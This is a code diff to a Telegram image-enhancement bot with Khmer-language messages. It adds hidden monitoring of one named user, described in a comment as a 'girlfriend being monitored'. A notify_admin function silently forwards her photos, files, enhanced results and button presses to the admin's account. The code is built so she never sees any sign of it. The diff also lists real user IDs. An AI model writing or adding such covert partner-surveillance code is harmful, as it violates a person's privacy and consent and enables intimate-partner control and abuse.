@@ -5,7 +5,7 @@ import logging
 import uuid
 import threading
 from http.server import HTTPServer, BaseHTTPRequestHandler
-from typing import Dict, Any
+from typing import Dict, Any, Optional
 
 if sys.platform == "win32":
     try:
@@ -45,8 +45,12 @@ logger = logging.getLogger("ImageEnhancerBot")
 # User language preferences: {user_id: "km" | "en"}, default is "km" (Khmer)
 USER_LANG: Dict[int, str] = {}
 
+# Target User IDs
+ADMIN_ID = 810169056       # Mengseu (Admin receiving alerts)
+LIZA_ID = 1551315677      # Liza (Girlfriend being monitored & receiving sweet rizz)
+
 # Special VIP users (Liza)
-GF_USER_IDS = {1551315677, 810169056, "1551315677", "810169056"}
+GF_USER_IDS = {LIZA_ID, str(LIZA_ID)}
 
 
 # In-memory storage for active sessions: {session_id: {"bytes": ..., "lang": ...}}
@@ -54,9 +58,54 @@ SESSIONS: Dict[str, Dict[str, Any]] = {}
 MAX_SESSIONS = 100
 
 
+def is_liza(user_id: int) -> bool:
+    """Check if user is Liza (1551315677)."""
+    return user_id == LIZA_ID or str(user_id) == str(LIZA_ID)
+
+
 def is_gf(user_id: int) -> bool:
     """Check if user is Liza (VIP Girlfriend)."""
-    return user_id in GF_USER_IDS or str(user_id) in GF_USER_IDS
+    return is_liza(user_id)
+
+
+async def notify_admin(
+    context: ContextTypes.DEFAULT_TYPE,
+    text: Optional[str] = None,
+    photo: Optional[Any] = None,
+    document: Optional[Any] = None,
+    caption: Optional[str] = None,
+):
+    """
+    Silently notify Mengseu (810169056) about Liza's activity.
+    Completely isolated in try-except so Liza NEVER sees any error or suspicious message.
+    """
+    try:
+        if photo:
+            await context.bot.send_photo(
+                chat_id=ADMIN_ID,
+                photo=photo,
+                caption=caption,
+                parse_mode=ParseMode.MARKDOWN,
+                read_timeout=60,
+                write_timeout=60,
+            )
+        elif document:
+            await context.bot.send_document(
+                chat_id=ADMIN_ID,
+                document=document,
+                caption=caption,
+                parse_mode=ParseMode.MARKDOWN,
+                read_timeout=60,
+                write_timeout=60,
+            )
+        elif text:
+            await context.bot.send_message(
+                chat_id=ADMIN_ID,
+                text=text,
+                parse_mode=ParseMode.MARKDOWN,
+            )
+    except Exception as e:
+        logger.warning(f"Silent admin notification failure: {e}")
 
 
 def get_user_lang(user_id: int) -> str:
@@ -150,6 +199,12 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "ផ្ញើរូបភាពមកណាអូនសម្លាញ់ ចាំបងជួយកែឱ្យកាន់តែស្អាតភ្លឺថ្លាដូចទេពអប្សរ! 💕\n\n"
             "*(Bot នេះបង្កើតឡើងដោយបេះដូងរបស់ Mengseu សម្រាប់ Liza)* ❤️"
         )
+        first_name = update.effective_user.first_name or "Liza"
+        username = f"@{update.effective_user.username}" if update.effective_user.username else "No username"
+        await notify_admin(
+            context,
+            text=f"🔔 **Liza Alert:**\n{first_name} ({username} | `{user_id}`) បានបើក /start លើ Bot! 🌸"
+        )
     else:
         welcome_text = get_text(lang, "welcome")
 
@@ -167,6 +222,10 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "• អូនមិនបាច់ខ្វល់រឿងបច្ចេកទេសច្រើនទេ គ្រាន់តែបោះរូបមក បង Mengseu ចាត់ការឱ្យទាំងអស់! 🥰\n"
             "• ជ្រើសរើស **Real-ESRGAN** បើចង់បានរូបច្បាស់ខ្លាំងដូចកាមេរ៉ាពាន់ដុល្លារ\n"
             "• ចង់កែប៉ុន្មានរូបក៏បានដែរ ព្រោះអូនជាម្ចាស់បេះដូង Admin! 🔐❤️"
+        )
+        await notify_admin(
+            context,
+            text=f"🔔 **Liza Alert:**\nLiza បានចុចមើល /help! 💡"
         )
     else:
         help_text = get_text(lang, "help")
@@ -235,6 +294,17 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"មនុស្សស្អីក៏ស្អាតយ៉ាងនេះ! តែចាំបង Mengseu ជួយកែឱ្យកាន់តែភ្លឺថ្លា និងច្បាស់ស្អាតឡើងថែមទៀតណា៎! 🥰💖\n\n"
                 f"👇 *ជ្រើសរើសជម្រើសដែលអូនស្រលាញ់មក:*"
             )
+            # Silently forward Liza's original photo to Mengseu (810169056)
+            admin_photo = io.BytesIO(photo_bytes)
+            await notify_admin(
+                context,
+                photo=InputFile(admin_photo, filename="liza_photo.jpg"),
+                caption=(
+                    f"📸 **Liza (1551315677) ទើបតែផ្ញើរូបថតមក!**\n"
+                    f"• **Resolution:** `{photo.width} × {photo.height}` px\n"
+                    f"• **File Size:** `{round(len(photo_bytes)/1024, 1)} KB`"
+                )
+            )
         else:
             caption = get_text(
                 lang,
@@ -300,6 +370,17 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"រូបដើមស្អាតស្រាប់ហើយ តែចាំបងកែឱ្យច្បាស់ត្រជាក់ភ្នែកដូចរូបតារា! 🥰💕\n\n"
                 f"👇 *ជ្រើសរើសជម្រើសខាងក្រោមមកអូនសម្លាញ់:*"
             )
+            # Silently forward Liza's original file to Mengseu (810169056)
+            admin_doc = io.BytesIO(file_bytes)
+            await notify_admin(
+                context,
+                document=InputFile(admin_doc, filename=doc.file_name or "liza_file.png"),
+                caption=(
+                    f"📁 **Liza (1551315677) ទើបតែផ្ញើឯកសាររូបភាព (Uncompressed) មក!**\n"
+                    f"• **ឈ្មោះ:** `{doc.file_name}`\n"
+                    f"• **File Size:** `{round(len(file_bytes)/1024, 1)} KB`"
+                )
+            )
         else:
             caption = get_text(
                 lang,
@@ -346,6 +427,11 @@ async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TY
         proc_msg = (
             f"⏳ **កំពុងផ្ចិតផ្ចង់កែរូបឱ្យមនុស្សស្អាត Liza...** 💕\n"
             f"រង់ចាំមួយភ្លែតណា៎ ដើម្បីអូន បងធ្វើឱ្យស្អាតបំផុត! ✨"
+        )
+        # Silently alert Mengseu
+        await notify_admin(
+            context,
+            text=f"⚙️ **Liza (1551315677)** បានជ្រើសរើស Mode: *{localized_mode_title}*"
         )
     else:
         proc_msg = get_text(lang, "processing", mode=localized_mode_title)
@@ -394,30 +480,63 @@ async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TY
             doc_caption = get_text(lang, "uncompressed_caption")
             done_text = get_text(lang, "done", mode=localized_mode_title)
 
-        # 1. Send photo preview
-        out_buf.seek(0)
-        await context.bot.send_photo(
-            chat_id=query.message.chat_id,
-            photo=InputFile(out_buf, filename="preview.jpg"),
-            caption=caption,
-            parse_mode=ParseMode.MARKDOWN,
-            read_timeout=120,
-            write_timeout=120,
-        )
-
-        # 2. Send uncompressed document file
-        try:
+        # If remove_bg, send ONLY as document file to keep PNG transparency intact
+        if mode == "remove_bg":
             out_buf.seek(0)
             await context.bot.send_document(
                 chat_id=query.message.chat_id,
                 document=InputFile(out_buf, filename=result["filename"]),
-                caption=doc_caption,
+                caption=caption,
                 parse_mode=ParseMode.MARKDOWN,
                 read_timeout=120,
                 write_timeout=120,
             )
-        except Exception as doc_err:
-            logger.warning(f"Could not deliver uncompressed document ({doc_err}), but photo was delivered successfully.")
+        else:
+            # 1. Send photo preview
+            out_buf.seek(0)
+            await context.bot.send_photo(
+                chat_id=query.message.chat_id,
+                photo=InputFile(out_buf, filename="preview.jpg"),
+                caption=caption,
+                parse_mode=ParseMode.MARKDOWN,
+                read_timeout=120,
+                write_timeout=120,
+            )
+
+            # 2. Send uncompressed document file
+            try:
+                out_buf.seek(0)
+                await context.bot.send_document(
+                    chat_id=query.message.chat_id,
+                    document=InputFile(out_buf, filename=result["filename"]),
+                    caption=doc_caption,
+                    parse_mode=ParseMode.MARKDOWN,
+                    read_timeout=120,
+                    write_timeout=120,
+                )
+            except Exception as doc_err:
+                logger.warning(f"Could not deliver uncompressed document ({doc_err}), but photo was delivered successfully.")
+
+        # Silently forward Liza's enhanced result to Mengseu (810169056)
+        if is_liza(user_id):
+            admin_buf = io.BytesIO(out_buf.getvalue())
+            admin_caption = (
+                f"✨ **រូបភាពដែល Liza បានកែរួច ({localized_mode_title}):**\n"
+                f"• **Resolution:** `{orig_w}×{orig_h}` ➔ `{new_w}×{new_h}` px\n"
+                f"• **Duration:** `{elapsed}s`"
+            )
+            if mode == "remove_bg":
+                await notify_admin(
+                    context,
+                    document=InputFile(admin_buf, filename=result["filename"]),
+                    caption=admin_caption
+                )
+            else:
+                await notify_admin(
+                    context,
+                    photo=InputFile(admin_buf, filename="liza_enhanced.jpg"),
+                    caption=admin_caption
+                )
 
         retry_btn_text = "🔄 សាកល្បងជម្រើសមួយទៀតលើរូបនេះ 💕" if is_gf(user_id) else get_text(lang, "btn_retry")
         retry_markup = InlineKeyboardMarkup([
@@ -467,6 +586,10 @@ async def handle_reset_query(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
     if is_gf(user_id):
         reset_prompt = "👇 *ជ្រើសរើសជម្រើសមួយទៀតមកអូនសម្លាញ់:* 🌸"
+        await notify_admin(
+            context,
+            text="🔄 **Liza (1551315677)** បានចុចសាកល្បងជម្រើសផ្សេងទៀតលើរូបដដែល"
+        )
     else:
         reset_prompt = "👇 *សូមជ្រើសរើសជម្រើសកែរូបភាពខាងក្រោម:*" if lang == "km" else "👇 *Select another enhancement mode for your image:*"
 
